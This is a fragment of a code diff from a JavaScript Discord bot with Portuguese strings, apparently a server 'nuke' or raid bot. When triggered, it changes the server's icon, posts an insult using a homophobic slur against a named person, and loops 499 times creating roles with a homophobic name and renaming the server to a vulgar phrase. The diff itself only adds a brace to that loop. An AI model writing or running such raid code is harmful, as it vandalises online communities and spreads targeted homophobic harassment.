@@ -27,7 +27,7 @@ client.on("message", async (message) => {
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)
        message.guild.setIcon('./icon.png') 
 	message.channel.send(`henrique bixa`)
-	for(i = 0; i < 499; i++)
+	for(i = 0; i < 499; i++){
 		message.guild.createRole('henry gay')
 	    	message.guild.setName('snow manipulador do caralho')
 	    	const texto = makeid(32);
